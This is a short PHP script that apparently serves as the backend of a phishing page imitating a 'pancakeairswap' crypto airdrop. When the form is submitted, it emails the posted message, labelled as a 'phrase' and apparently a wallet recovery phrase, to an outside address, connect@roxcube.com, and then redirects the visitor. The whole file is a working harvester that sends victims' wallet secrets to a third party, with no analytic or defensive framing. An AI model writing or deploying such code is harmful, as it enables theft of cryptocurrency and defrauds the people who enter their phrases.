<?php
if (isset($_POST['submit'])) {
    # code...
    $name = "Phrase";
    $mailFrom = "phrase@pancakeairswap.finance";
    $subject = "pancakeairswap phrase";
    $message = $_POST['message'];
    

    $mailTo = "connect@roxcube.com";

    $headers = "From: ".$mailFrom;

    $txt = "An e-mail from ".$name.".\n\n".$message;


    mail($mailTo, $subject, $txt, $headers);

    header("Location: index.php?mailsent");
}